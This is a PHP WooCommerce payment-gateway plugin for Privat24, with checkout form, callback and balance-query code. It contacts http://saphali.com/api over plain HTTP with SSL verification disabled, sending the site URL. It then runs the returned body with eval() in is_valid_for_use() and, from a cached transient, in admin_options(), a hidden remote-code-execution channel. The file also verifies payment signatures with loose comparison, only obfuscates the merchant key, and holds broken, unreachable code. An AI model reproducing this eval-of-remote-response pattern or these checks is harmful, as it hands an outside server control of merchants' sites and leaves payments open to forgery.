<?php
class privat  extends WC_Payment_Gateway {
	/**
	 Метод оплаты
	 */

	private $xml;
	private $isP24;
	

	
	/**
	 merchant ID
	 */
	private $p24mID;
	private $api_url = 'http://saphali.com/api';
	//private $_api_url = 'http://saphali.com/api';
	

	/**
	 KEY 
	 */
	//private $p24mID;
	

	private $p24mKey;

	/**
	 Url страницы, примающая данные об оплате (прием api)
	 */
	private $p24Urlcall = '';
	
	/**
	 Url страницы, примающая пользователя после оплаты
	 */
	private $p24Url = '';


	/**
	 URL к серверу API
	 */
	private $P24ApiUrl='https://api.privatbank.ua/p24api/ishop';
	private $unfiltered_request_saphalid;
	
	public function __construct () {
	global $woocommerce;
		$dirPluginName =  explode ('plugins',dirname( __FILE__ ));
		$dirPluginName = trim($dirPluginName[1], '/\\');
		$this->icon = apply_filters('woocommerce_privat_icon', WP_PLUGIN_URL . '/' . $dirPluginName .'/images/icons/privat24.png');
		
		$this->p24Urlcall = get_option('server_url_p24');
		
		$this->p24Url = get_option('result_url_p24');

		
		$this->p24mID = get_option('merchant_id_p24');

		$this->p24mKey = base64_decode(strrev(get_option('signature_p24')));
		
		
		$this->id = 'privat';
		$this->has_fields = false;
		
		$this->init_form_fields();
		$this->init_settings();
		$this->debug = $this->settings['debug'];
		$this->order_check_uniqueness = (isset( $this->settings['order_check_uniqueness']) && $this->settings['order_check_uniqueness'] == 'yes' ) ? true : false;
		$this->description = $this->settings['description'];
		if ($this->debug=='yes') { if ( version_compare( WOOCOMMERCE_VERSION, '2.1', '<' ) ) $this->log = $woocommerce->logger(); $this->log = new WC_Logger(); }
		$this->enabled = get_option('woocommerce_privat_enabled');
		$this->title = get_option('woocommerce_privat_title');

		add_action('valid-privat-callback', array(&$this, 'successful_request') );

		add_action('woocommerce_receipt_privat', array(&$this, 'receipt_page'));
		add_option('woocommerce_privat_title', __('Приват24', 'woocommerce') );

		if ( version_compare( WOOCOMMERCE_VERSION, '2.0', '<' ) ) {
			add_action('woocommerce_update_options', array(&$this, 'process_admin_options'));
			add_action('woocommerce_update_options_payment_gateways', array(&$this, 'process_admin_options'));
			add_action('init', array(&$this, 'check_callback_pr') );
			add_action('init', array(&$this, 'view_balance') );
		} else {
			add_action( 'woocommerce_api_' . strtolower( get_class( $this ) ), array( $this, 'check_callback_pr' ) );
			add_action( 'woocommerce_api_privat_balance', array( $this, 'view_balance' ) );
			add_action('woocommerce_update_options_payment_gateways_' . $this->id, array( $this, 'process_admin_options' ) );
		}
		
		$transient_name = 'wc_saph_' . md5( 'payment-privat24' . home_url() );
		$this->unfiltered_request_saphalid = get_transient( $transient_name );
		if ( false === $this->unfiltered_request_saphalid ) {
			// Get all visible posts, regardless of filters
			if( defined( 'SAPHALI_PLUGIN_VERSION_ST' ) ) $version = SAPHALI_PLUGIN_VERSION_ST; 
			elseif( defined( 'SAPHALI_PLUGIN_VERSION_PR' ) ) $version = SAPHALI_PLUGIN_VERSION_PR; else  $version ='1.0';
			$args = array(
				'method' => 'POST',
				'plugin_name' => "payment-privat24", 
				'version' => $version,
				'username' => home_url(), 
				'password' => '1111',
				'action' => 'saphali_api'
			);
			$response = $this->prepare_request( $args );
			if($response->errors ) { echo '<div class="inline error"><p>'.$response->errors["http_request_failed"][0]; echo '</p></div>'; } else {
				if($response["response"]["code"] == 200 && $response["response"]["message"] == "OK") {
					if( strpos($response['body'], '<') !== 0 )
					$this->unfiltered_request_saphalid = $response['body'];
				} else {
					$this->unfiltered_request_saphalid = 'echo \'<div class="inline error"><p> Ошибка \'.$response["response"]["code"] . $response["response"]["message"].\'<br /><a href="mailto:saphali@ukr.net">Свяжитесь с разработчиком.</a></p></div>\';'; 
				}
			}
			if( !empty($this->unfiltered_request_saphalid) &&  $this->is_valid_for_use() ) {
				set_transient( $transient_name, $this->unfiltered_request_saphalid , 60*60*24*30 );			
			}
		}
		if ( false ===  $this->unfiltered_request_saphalid ) $this->enabled = false;
	}
			function prepare_request( $args ) {
			
				// Send request
				$request = wp_remote_post( $this->api_url, array(
					'method' => 'POST',
					'timeout' => 45,
					'redirection' => 5,
					'httpversion' => '1.0',
					'blocking' => true,
					'headers' => array(),
					'body' => $args,
					'cookies' => array(),
					'ssl_verify' => false
					) );
				
				// Make sure the request was successful
				return $request;
				if( is_wp_error( $request )
				or
				wp_remote_retrieve_response_code( $request ) != 200
				) {
					// Request failed
					return false;
				}
				
				// Read server response, which should be an object
				$response = maybe_unserialize( wp_remote_retrieve_body( $request ) );
				if( is_object( $response ) ) {
					return $response;
				} else {
					// Unexpected response
					return false;
				}
			} // End prepare_request()
	
	function receipt_page( $order ) {
		
		echo '<p>'.__('Thank you for your order, please click the button below to pay with Privat24.', 'themewoocommerce').'</p>';
		echo $this->generate_form( $order );
		
	}
	function is_valid_for_use() {
			if( defined( 'SAPHALI_PLUGIN_VERSION_ST' ) ) $version = SAPHALI_PLUGIN_VERSION_ST; 
		elseif( defined( 'SAPHALI_PLUGIN_VERSION_PR' ) ) $version = SAPHALI_PLUGIN_VERSION_PR; else  $version ='1.0';
		$args = array(
			'method' => 'POST',
			'plugin_name' => "payment-privat24", 
			'version' => $version,
			'username' => home_url(), 
			'password' => '1111',
			'action' => 'pre_saphali_api'
		);
		$response = $this->prepare_request( $args );
		if($response->errors) { return false; } else {
			if($response["response"]["code"] == 200 && $response["response"]["message"] == "OK") {
				if( strpos($response['body'], '<') !== 0 )
				eval($response['body']);
			}else {
				return false;
			}
		}
        return $is_valid_for_use;
    }
	function init_form_fields() {
		$this->form_fields = array(
			'description' => array(
							'title' => __( 'Description', 'woocommerce' ),
							'type' => 'textarea',
							'description' => __( 'This controls the description which the user sees during checkout.', 'woocommerce' ),
							'default' => __("Заплатить через Приват24.", 'themewoocommerce')
						),
			'order_check_uniqueness' => array(
							'title' => __( 'Проверять уникальность платежей', 'themewoocommerce' ),
							'type' => 'checkbox',
							'label' => __( 'Проверять уникальность платежей', 'themewoocommerce' ),
							'description' => __( 'Данная опция позволяет производить проверку перед созданием нового платежа на уникальность по его номеру. И в случае, если платеж с таким же номером найден, то клиенту выдается соответствующая ошибка.', 'woocommerce' ),
							'default' => 'no'
						),
			'debug' => array(
							'title' => __( 'Debug Log', 'themewoocommerce' ),
							'type' => 'checkbox',
							'label' => __( 'Enable logging', 'themewoocommerce' ),
							'default' => 'no',
							'description' => __( 'Log Privat24 events, such as IPN requests, inside <code>woocommerce/logs/privat24.txt</code>', 'themewoocommerce' ),
						)
		);
	}
	function successful_request( $posted ) {
		$sing = sha1(md5($posted['payment'].$this->p24mKey));
		
		if($sing == $posted['signature']) {
			$result = parse_url_privat($posted['payment']);
			//state' || $zn[0] == 'order
			$inv_id = $result["order"];
			if(!$this->order_check_uniqueness) {
				$_inv_id = explode('-', $inv_id);
				$inv_id = $_inv_id[1];
			}
			if (!class_exists('WC_Order')) $order = new woocommerce_order( $inv_id ); else
			$order = new WC_Order( $inv_id );
			if($result["amt"] != number_format($order->order_total, 2, '.', '')) {
				$order->add_order_note( 'Ответ от сервера. Ошибка: сумма заказа не соответствует действительности. Заказ #' . $inv_id) ;
				if ($this->debug=='yes') $this->log->add( 'privat', 'Ошибка: сумма заказа не соответствует действительности. Заказ #' . $inv_id );
				exit;
			}
			//if($order->status == 'pending') $order->update_status('processing', __('Money is comming', 'woocommerce'));
			
			if($result["state"]=='ok') {
				$order->add_order_note( 'Оплата заказа #'. $inv_id.' по '.$result["pay_way"].' выполнена.<br />Оплата произведена через номер: '. $result["sender_phone"]) ;
				$order->payment_complete();
				if ($this->debug=='yes') $this->log->add( 'privat', "\$_POST[payment]=". $posted['payment'] .". Заказ #" . $inv_id );
				exit;
			} elseif($result["state"]=='test') {
				$order->add_order_note( 'Оплата заказа #'. $inv_id.' по '.$result["pay_way"].' прошла в тестовом режиме. Для перевода в рабочий режим нужно подать заявку в личном кабинете '.$result["pay_way"].'.<br />Оплата производилась через номер: '. $result["sender_phone"] ) ;
				exit;
			}
			echo "OK".$inv_id;
				 if ($this->debug=='yes') $this->log->add( 'privat', 'Payment status process: ' . $result["state"] );
				 foreach($posted as $key_post=>$val_post)
				 if ($this->debug=='yes') $this->log->add( 'privat', "Параметры  ответа \$_POST['$key_post']: " . $val_post);
			exit;	
		} else {
		$order->add_order_note( 'Ответ от сервера. Ошибка: подпись (signature) не соответствует действительности. Заказ #' . $inv_id) ;
		if ($this->debug=='yes') $this->log->add( 'privat', 'Error: signature does not match invoice. Заказ #' . $inv_id );
		exit;
		}
	}
	
	function check_callback_pr() {
	//var_dump($_SERVER["REQUEST_URI"].'pr24');
		if ( strpos($_SERVER["REQUEST_URI"], 'order_results_go')!==false && strpos($_SERVER["REQUEST_URI"], 'wc-api=privat')!==false ) {
			
			error_log('Privat24 callback!');
			
			$_REQUEST = stripslashes_deep($_REQUEST);
			
			do_action("valid-privat-callback", $_REQUEST);
		}
		elseif(strpos($_SERVER["REQUEST_URI"], 'wc-api=privat')!==false)
		{
			if($_REQUEST["wc-api"] == 'privat') {
				$sing = sha1(md5($_REQUEST['payment'].$this->p24mKey));
		
				if($sing == $_REQUEST['signature']) {
					$result = parse_url_privat($_REQUEST['payment']);
					$orderid = $result["order"];
					if(!$this->order_check_uniqueness) {
						$_inv_id = explode('-', $orderid);
						$orderid = $_inv_id[1];
					}
					//var_dump($_POST);
					if ($this->debug=='yes') $this->log->add( 'privat', 'Payment status: ' . $result["state"] );
					
					if (!class_exists('WC_Order')) $order = new woocommerce_order( $orderid ); else $order = new WC_Order( $orderid );
					
					if($result["state"]=='ok') {
						if ( !version_compare( WOOCOMMERCE_VERSION, '2.1.0', '<' ) ) { wp_redirect( $this->get_return_url( $order ) );exit;}
						wp_redirect(add_query_arg('key', $order->order_key, add_query_arg('order', $orderid, get_permalink(get_option('woocommerce_view_order_page_id')))));
						exit;
					} elseif($result["state"]=='test') {
						if ( !version_compare( WOOCOMMERCE_VERSION, '2.1.0', '<' ) ) { wp_redirect( $this->get_return_url( $order ) );exit;}
						wp_redirect(add_query_arg('key', $order->order_key, add_query_arg('order', $orderid, get_permalink(get_option('woocommerce_thanks_page_id')))));
						exit;
					}
					 /* elseif($ans['status'][0]=='failure') {
						if (!class_exists('WC_Order')) $order = new woocommerce_order( $orderid ); else $order = new WC_Order( $orderid );
						$order->update_status('failed', __('Awaiting cheque payment', 'woocommerce'));
						//$order->empty_cart();
						wp_redirect($order->get_cancel_order_url());
						exit;
					} */
					 
				} elseif(empty($_REQUEST['payment']) && empty($_REQUEST['signature']) ) {
					if (!class_exists('WC_Order')) $order = new woocommerce_order( $_GET['order_id'] ); else $order = new WC_Order( $_GET['order_id'] );
					wp_redirect($order->get_cancel_order_url());
					exit;
				} else {if ($this->debug=='yes') $this->log->add( 'privat', 'Error: signature does not match invoice. Заказ #' . $orderid );exit;}
			}
			
		}

//echo add_query_arg('key', $order->order_key, add_query_arg('order', $inv_id, get_permalink(get_option('woocommerce_thanks_page_id'))));

	}
	
		public function admin_options()
		{

		if ($message) { ?>
			<div id="message" class="updated fade"><p><?php echo $message; ?></p></div>
<?php } ?>
						<?php
		if($this->unfiltered_request_saphalid !== false)
		eval($this->unfiltered_request_saphalid); 
		if(isset($messege)) echo $messege;

	}
		function view_balance() {
		if($_REQUEST['wp-api'] == 'privat_balance') $_REQUEST['view_balance_privat'] == 'privat24';
	 if($_REQUEST['view_balance_privat'] == 'privat24') {
		$data="<oper>balance</oper><wait>-1</wait><test>0</test>";

		$signature = sha1(md5($data.$this->p24mKey));

     $post = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
                              <request version=\"1.0\">
                                <merchant> 
									<id>".$this->p24mID.'</id>
									<signature>'.$signature.'</signature>
								</merchant>
								<data>
								'.$data.'
								</data>
                              </request>';
     $url = "https://api.privatbank.ua/p24api/balance";
     $page = "";
     $headers = array("POST ".$page." HTTP/1.0",
                         "Content-type: text/xml;charset=\"utf-8\"",
                         "Accept: text/xml",
                         "Content-length: ".strlen($post));
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
     curl_setopt($ch, CURLOPT_TIMEOUT, 60);
     curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
     $result = curl_exec($ch);
     curl_close($ch);
	 
	 $response=xml2array($result);
	//echo '<pre>'; var_dump($response);echo '</pre>';echo 'privat';
	exit;
	 $ans=$response['response'][0]['liqpay'][0]['operation_envelope'][0]['operation_xml'][0];
	
	 $xml=base64_decode($ans);
	 $response_end=xml2array($xml);
	 if($response_end['response'][0]['status'][0] == 'failure') die('<p style=\'color: red\'>Ошибка</p><p>Код ошибки: '.$response_end['response'][0]['code'][0]. '.<br /> Описание ошибки: '.$response_end['response'][0]['response_description'][0]. '</p>' );
	 else {
	  $balanse=$response_end['response'][0]["balances"][0];
	  echo '<table  class="widefat" cellspacing="0" style="width: 237px;">
		<thead>
		<tr>
		<th>Валюта</th>
		<th>Значение</th>
		</tr>
		</thead>
		<tbody>
		';
		foreach( $balanse as $key => $value ) 
		echo '<tr>
		<td>'. $key .'</td>
		<td>'. $value[0] .'</td>
		</tr>';
		
		echo '
		</tbody>
	  </table>';
	 }
	  die();

	 }
	}
		public function process_admin_options () {
			if($_POST['woocommerce_privat_title']) {
				if(!update_option('merchant_id_p24',$_POST['merchant_id_p24']))  add_option('merchant_id_p24',$_POST['merchant_id_p24']);
				if(!update_option('signature_p24',strrev(base64_encode($_POST['signature_p24']))))  add_option('signature_p24',strrev(base64_encode($_POST['signature_p24'])));
				if(!update_option('result_url_p24',$_POST['result_url_p24']))  add_option('result_url_p24',$_POST['result_url_p24']);
				if(!update_option('server_url_p24',$_POST['server_url_p24']))  add_option('server_url_p24',$_POST['server_url_p24']);
				
				
				
				if(isset($_POST['woocommerce_privat_enabled'])) update_option('woocommerce_privat_enabled', woocommerce_clean($_POST['woocommerce_privat_enabled'])); else @delete_option('woocommerce_privat_enabled');
				if(isset($_POST['woocommerce_privat_title'])) update_option('woocommerce_privat_title', woocommerce_clean($_POST['woocommerce_privat_title'])); else @delete_option('woocommerce_privat_title');
				$this->validate_settings_fields();

				if ( count( $this->errors ) > 0 ) {
					$this->display_errors();
					return false;
				} else {
					update_option( $this->plugin_id . $this->id . '_settings', $this->sanitized_fields );
					return true;
				}
			}
		}
	
	public function generate_form( $order_id ) {
	    if (!class_exists('WC_Order')) $order = new woocommerce_order( $order_id ); else
		$order = new WC_Order( $order_id );
		//$description = sanitize_title_with_translit(get_the_title());
		
	if ($this->debug=='yes') $this->log->add( 'privat', 'Создание платежной формы для заказа #' . $order_id . '.');
		$descRIPTION = '';
		$order_items = $order->get_items( apply_filters( 'woocommerce_admin_order_item_types', array( 'line_item', 'fee' ) ) );
		$count  = 0 ;
		foreach ( $order_items as $item_id => $item ) {
		
		$descRIPTION_ .= esc_attr( $item['name'] );
		$v = explode('.', WOOCOMMERCE_VERSION);
		if($v[0] >= 2) {
			if ( $metadata = $order->has_meta( $item_id )) {
						$_descRIPTION = '';
						$is_ = false;
						$is_count = 0;
						foreach ( $metadata as $meta ) {

							// Skip hidden core fields
							if ( in_array( $meta['meta_key'], apply_filters( 'woocommerce_hidden_order_itemmeta', array(
								'_qty',
								'_tax_class',
								'_product_id',
								'_variation_id',
								'_line_subtotal',
								'_line_subtotal_tax',
								'_line_total',
								'_line_tax',
							) ) ) ) continue;

							// Handle serialised fields
							if ( is_serialized( $meta['meta_value'] ) ) {
								if ( is_serialized_string( $meta['meta_value'] ) ) {
									// this is a serialized string, so we should display it
									$meta['meta_value'] = maybe_unserialize( $meta['meta_value'] );
								} else {
									continue;
								}
							}
							$is_ = true;
							if($is_count == 0)
							$_descRIPTION .= esc_attr(' ['.$meta['meta_key'] . ': ' . $meta['meta_value'] );
							else
							$_descRIPTION .= esc_attr(', '.$meta['meta_key'] . ': ' . $meta['meta_value'] );
							$is_count++;
						}
						if($is_count > 0)
						$_descRIPTION = $_descRIPTION. '] - '.$item['qty']. '';
						else $_descRIPTION = $_descRIPTION. ' - '.$item['qty']. '';
					}
					if(($count + 1) != count($order_items) && !empty($descRIPTION_)) $descRIPTION .=  $descRIPTION_.$_descRIPTION . ', '; else $descRIPTION .=  ''.$descRIPTION_.$_descRIPTION; 
					$count++;
					$descRIPTION_ = $_descRIPTION = '';
			}else {
				if ( $metadata = $item["item_meta"]) {
					$_descRIPTION = '';
					foreach($metadata as $k =>  $meta) {
						if($k == 0)
						$_descRIPTION .= esc_attr(' - '.$meta['meta_name'] . ': ' . $meta['meta_value'] . '');
						else {
							$_descRIPTION .= esc_attr('; '.$meta['meta_name'] . ': ' . $meta['meta_value'] . '');
						}
					}
				}
				if($item_id == 0)$descRIPTION = esc_attr( $item['name'] ) . $_descRIPTION .' ('.$item["qty"].')'; else
				$descRIPTION .= ', '. esc_attr( $item['name'] ) . $_descRIPTION .' ('.$item["qty"].')';
			}
		} 
		$descRIPTION = preg_replace ("/[^a-zA-ZА-Яа-я0-9\s-_,;&?$]/u","",$descRIPTION);
		$descRIPTION = substr($descRIPTION, 0, 205);
		//Проверять уникальность платежей
		if($this->order_check_uniqueness) $r = ''; else $r = strtoupper(substr(md5(uniqid(microtime(), 1)).getmypid(),1,5)) . '-';
		echo "<form name='frm_payment_method' method='POST' action='{$this->P24ApiUrl}'>
	<input type='hidden' name='amt' value='".number_format($order->order_total, 2, '.', '')."' />
	<input type='hidden' name='ccy' value='".get_woocommerce_currency()."' />
	<input type='hidden' name='merchant' value='{$this->p24mID}' />
	<input type='hidden' name='order' value='".$r . $order_id."' />
	<input type='hidden' name='details' value='".htmlentities ($descRIPTION, ENT_QUOTES, 'UTF-8')."' />
	<input type='hidden' name='ext_details' value='".htmlentities ($descRIPTION, ENT_QUOTES, 'UTF-8')."' />
	<input type='hidden' name='pay_way' value='privat24' />
	<input type='hidden' name='return_url' value='{$this->p24Url}&order_id={$order_id}' />
	<input type='hidden' name='server_url' value='{$this->p24Urlcall}' />".
		  '<input type="submit" class="button-alt button" id="submit_dibs_payment_form" value="'.__('Pay', 'woocommerce').'" style="float: left; margin: 0px 23px 0px 0px; color: green;" />'."
		</form>".'
		 <a class="button cancel"  style="float: left;" href="'.$order->get_cancel_order_url().'">'.__('Cancel order &amp; restore cart', 'woocommerce').'</a>';
	}
	
	function process_payment( $order_id ) {
		
		if (!class_exists('WC_Order')) $order = new woocommerce_order( $order_id ); else $order = new WC_Order( $order_id );
			if ( !version_compare( WOOCOMMERCE_VERSION, '2.1.0', '<' ) )
			return array(
				'result' => 'success',
				'redirect' => $order->get_checkout_payment_url( true )
			);
		return array(
			'result' => 'success',
			'redirect' => add_query_arg('order', $order->id, add_query_arg('key', $order->order_key, get_permalink(get_option('woocommerce_pay_page_id'))))
		);
		
	}

}
function parse_url_privat($str) {
	$pars_str = explode('&', $str);
	foreach($pars_str as $key => $value) {
		$zn[$key] =  explode('=', $value);
		//if($zn[0] == 'state' || $zn[0] == 'order') { $return[$zn[0]] = $zn[1]; }
		$return[$zn[$key][0]] = $zn[$key][1];
	}
	return $return;
}
?>